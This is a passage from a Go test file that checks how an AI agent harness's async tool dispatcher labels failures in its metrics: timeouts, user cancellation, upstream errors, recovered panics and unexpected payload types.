		"anthropic", "claude-sonnet-4-6",
	)
	must.Empty(outcome, "unexpected stall outcome")
	failures := collectFailures(t, reader)
	timeoutHits := sumFailureValues(failuresInCategory(failures, observability.ToolFailureAsyncTimeout.String()))
	cancelledHits := sumFailureValues(failuresInCategory(failures, observability.ToolFailureAsyncCancelled.String()))
	must.Equal(int64(1), timeoutHits, "async_timeout count; full failures = %+v", failures)
	must.Equal(int64(0), cancelledHits,
		"async_cancelled count; a deadline must not route to cancelled; full failures = %+v", failures)
}

// TestToolFailureMetrics_AsyncCancelled exercises the user-driven
// cancellation path: a live transport that never resolves, dispatch
// blocks on the correlator, and the run context is cancelled
// explicitly (not via deadline). Must emit async_cancelled, NOT
// async_timeout — the operator-visible distinction the deadline split
// preserves.
func TestToolFailureMetrics_AsyncCancelled(t *testing.T) {
	must := require.New(t)
	tr := newAsyncTestTransport()
	loop, reader := buildMetricsHarness(t, []*tool.Tool{asyncEchoTool()}, nil, nil, tr)
	cfg := &types.RunConfig{
		RunID:        "test-run-cancel",
		Mode:         "execution",
		ToolDispatch: &types.ToolDispatchConfig{MaxParallel: 1},
	}
	ctx, cancel := context.WithCancel(context.Background())
	// Cancel once the request has been emitted (so we know the Await
	// is registered and will observe the cancellation via its
	// ctx.Done branch). The 2s deadline is a wiring-failure guard,
	// not a timeout we expect to hit.
	go func() {
		deadline := time.Now().Add(2 * time.Second)
		for time.Now().Before(deadline) {
			if tr.lastRequestID("tool_result_request") != "" {
				cancel()
				return
			}
			time.Sleep(time.Millisecond)
		}
	}()
	_, _, outcome := loop.planAndDispatch(
		ctx, cfg,
		[]types.ToolCall{{ID: "tc_cancel", Name: "async_echo", Input: json.RawMessage(`{}`)}},
		&stallDetector{},
		"anthropic", "claude-sonnet-4-6",
	)
	must.Empty(outcome, "unexpected stall outcome")
	failures := collectFailures(t, reader)
	cancelledHits := sumFailureValues(failuresInCategory(failures, observability.ToolFailureAsyncCancelled.String()))
	timeoutHits := sumFailureValues(failuresInCategory(failures, observability.ToolFailureAsyncTimeout.String()))
	must.Equal(int64(1), cancelledHits, "async_cancelled count; full failures = %+v", failures)
	must.Equal(int64(0), timeoutHits,
		"async_timeout count on explicit cancellation; full failures = %+v", failures)
}

// TestToolFailureMetrics_AsyncUpstreamError exercises the
// IsError=true response path: the control plane delivers a
// tool_result_response with IsError=true, which dispatch maps to
// async_upstream_error to keep upstream faults distinct from
// harness-side faults on dashboards.
func TestToolFailureMetrics_AsyncUpstreamError(t *testing.T) {
	must := require.New(t)
	tr := newAsyncTestTransport()
	loop, reader := buildMetricsHarness(t, []*tool.Tool{asyncEchoTool()}, nil, nil, tr)
	cfg := &types.RunConfig{
		RunID:        "test-run-upstream-err",
		Mode:         "execution",
		ToolDispatch: &types.ToolDispatchConfig{MaxParallel: 1},
	}
	// Fire a matching IsError=true response after the dispatch
	// emits its tool_result_request.
	go func() {
		deadline := time.Now().Add(2 * time.Second)
		for time.Now().Before(deadline) {
			if id := tr.lastRequestID("tool_result_request"); id != "" {
				yes := true
				tr.FireControl(types.ControlEvent{
					Type:      "tool_result_response",
					RequestID: id,
					Content:   "upstream said no",
					IsError:   &yes,
				})
				return
			}
			time.Sleep(time.Millisecond)
		}
	}()
	results, _, outcome := loop.planAndDispatch(
		context.Background(), cfg,
		[]types.ToolCall{{ID: "tc_upstream", Name: "async_echo", Input: json.RawMessage(`{}`)}},
		&stallDetector{},
		"anthropic", "claude-sonnet-4-6",
	)
	must.Empty(outcome, "unexpected stall outcome")
	must.Len(results, 1)
	must.True(results[0].IsError, "expected errored result, got %+v", results)
	must.Contains(results[0].Content, "upstream_error:")
	failures := collectFailures(t, reader)
	upstream := failuresInCategory(failures, observability.ToolFailureAsyncUpstreamError.String())
	for _, fp := range upstream {
		must.Equal("async_echo", fp.tool, "async_upstream_error tool.name")
	}
	must.Equal(int64(1), sumFailureValues(upstream), "async_upstream_error count; full failures = %+v", failures)
}

// TestToolFailureMetrics_AsyncPanic exercises the Phase 2 goroutine
// panic-recovery path: a panicking AsyncHandler must be recovered,
// converted into a structured tool failure, and tagged async_panic.
// Sibling calls must be unaffected — the panic test in
// dispatch_parallel_test.go covers that invariant; this test focuses
// on the metric emission specifically.
func TestToolFailureMetrics_AsyncPanic(t *testing.T) {
	must := require.New(t)
	tr := newAsyncTestTransport()
	panicTool := &tool.Tool{
		Name:        "async_will_panic",
		Description: "async tool whose preflight panics",
		InputSchema: json.RawMessage(`{"type":"object","properties":{}}`),
		AsyncHandler: func(_ context.Context, _ json.RawMessage) (tool.AsyncDispatch, error) {
			panic("synthetic panic for metrics test")
		},
	}
	loop, reader := buildMetricsHarness(t, []*tool.Tool{panicTool}, nil, nil, tr)
	cfg := &types.RunConfig{
		RunID: "test-run-panic",
		Mode:  "execution",
		// The fan-out goroutine is the panic recovery site; ensure
		// the async branch is taken by MaxParallel >= 1.
		ToolDispatch: &types.ToolDispatchConfig{MaxParallel: 1},
	}
	results, _, outcome := loop.planAndDispatch(
		context.Background(), cfg,
		[]types.ToolCall{{ID: "tc_panic_m", Name: "async_will_panic", Input: json.RawMessage(`{}`)}},
		&stallDetector{},
		"anthropic", "claude-sonnet-4-6",
	)
	must.Empty(outcome, "unexpected stall outcome")
	must.Len(results, 1)
	must.True(results[0].IsError, "expected errored result on panic, got %+v", results)
	must.Contains(results[0].Content, "panic")
	failures := collectFailures(t, reader)
	panics := failuresInCategory(failures, observability.ToolFailureAsyncPanic.String())
	for _, fp := range panics {
		must.Equal("async_will_panic", fp.tool, "async_panic tool.name")
	}
	must.Equal(int64(1), sumFailureValues(panics), "async_panic count; full failures = %+v", failures)
}

// TestToolFailureMetrics_AsyncInternalError exercises the defensive
// "unexpected payload type" branch in dispatchAsyncToolCall: when the
// correlator's Await returns a payload that is not an asyncToolResult,
// the type assertion fails and the call is tagged async_internal_error.
//
// The production path wires extractAsyncToolResult exclusively, which
// only ever produces asyncToolResult, so this branch has no model-facing
// trigger. The test installs a PayloadExtractor override via
// withAsyncExtractor that returns a string payload keyed by the request
// ID — the override unblocks Await like the real extractor but delivers
// the wrong concrete type, driving the fallthrough.
func TestToolFailureMetrics_AsyncInternalError(t *testing.T) {
	must := require.New(t)
	tr := newAsyncTestTransport()
	loop, reader := buildMetricsHarness(t, []*tool.Tool{asyncEchoTool()}, nil, nil, tr)
	// Override the extractor BEFORE the first dispatch constructs the
	// correlator. It matches on tool_result_response (so Await unblocks)
	// but returns a string rather than an asyncToolResult, forcing the
	// payload.(asyncToolResult) assertion to fail.
	loop.withAsyncExtractor(func(event types.ControlEvent) (string, any) {
		if event.Type != "tool_result_response" {
			return "", nil
		}
		return event.RequestID, "not an asyncToolResult"
	})
	cfg := &types.RunConfig{
		RunID:        "test-run-internal-err",
		Mode:         "execution",
		ToolDispatch: &types.ToolDispatchConfig{MaxParallel: 1},
	}
	go func() {
		deadline := time.Now().Add(2 * time.Second)
		for time.Now().Before(deadline) {
			if id := tr.lastRequestID("tool_result_request"); id != "" {
				tr.FireControl(types.ControlEvent{
					Type:      "tool_result_response",
					RequestID: id,
					Content:   "ignored — extractor override discards this",
				})
				return
			}
			time.Sleep(time.Millisecond)
		}
	}()
	results, _, outcome := loop.planAndDispatch(
		context.Background(), cfg,
		[]types.ToolCall{{ID: "tc_internal", Name: "async_echo", Input: json.RawMessage(`{}`)}},
		&stallDetector{},
		"anthropic", "claude-sonnet-4-6",
	)
	must.Empty(outcome, "unexpected stall outcome")
	must.Len(results, 1)
	must.True(results[0].IsError, "expected errored result, got %+v", results)
	must.Contains(results[0].Content, "internal error: unexpected payload type")
	failures := collectFailures(t, reader)
	internal := failuresInCategory(failures, observability.ToolFailureAsyncInternal.String())
	for _, fp := range internal {
		must.Equal("async_echo", fp.tool, "async_internal_error tool.name")
	}
	must.Equal(int64(1), sumFailureValues(internal), "async_internal_error count; full failures = %+v", failures)
}
